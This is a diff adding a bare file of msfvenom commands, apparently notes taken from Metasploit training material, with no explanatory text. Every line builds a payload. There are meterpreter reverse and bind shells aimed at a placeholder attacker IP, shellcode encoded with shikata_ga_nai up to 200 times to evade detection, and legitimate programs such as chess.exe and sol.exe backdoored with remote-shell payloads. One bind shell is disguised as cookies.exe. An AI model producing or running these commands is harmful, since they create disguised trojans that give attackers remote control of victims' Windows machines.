@@ -1,0 +1,21 @@
+
+msfvenom -l payloads
+msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
+msfvenom -p windows/meterpreter/bind_tcp -f exe
+msfvenom --help-formats
+msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
+msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= <your local IP> LPORT=<whatever port you want to listen on> -x /usr/share/chess.exe -e x86/shikata_ga_nai -i 200 -f exe >chess.exe
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
+ msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python -n 26
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python --smallest
+msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
+msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="We are evil" -f raw > messageBox2
+sfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
+msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
+
